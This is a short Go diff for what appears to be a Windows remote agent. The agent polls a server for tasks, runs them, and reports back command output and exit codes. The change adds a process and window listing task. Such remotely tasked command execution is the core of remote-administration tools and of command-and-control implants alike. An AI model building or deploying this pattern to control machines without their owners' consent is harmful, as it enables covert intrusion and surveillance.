@@ -41,7 +41,7 @@ func longPoll(id, key string) {
 	}
 	client.UseAccount(id, key)
 	for {
-		id, type_, body, err := client.PollTasks()
+		id, ttype, body, err := client.PollTasks()
 		if err != nil {
 			log.Println("Error during task polling:", err)
 			if id != -1 {
@@ -49,7 +49,7 @@ func longPoll(id, key string) {
 			}
 			continue
 		}
-		go executeTask(&client, id, type_, body)
+		go executeTask(&client, id, ttype, body)
 	}
 }
 
@@ -76,8 +76,12 @@ func executeTask(client *agent.Client, taskID int, type_ string, body map[string
 			"status_code": out.ProcessState.Sys().(windows.WaitStatus).ExitCode,
 			"output": string(returnResult),
 		})
+
 	case "proclist":
-		// TODO: Use Win32 to list PIDs with window names
-		client.SendTaskResult(taskID, map[string]interface{}{"error": true, "msg": "Not implemented"})
+		windowsArray := ListWindows()
+		responseMap := map[string]interface{} {
+			"procs": windowsArray,
+		}
+		client.SendTaskResult(taskID, responseMap)
 	}
 }
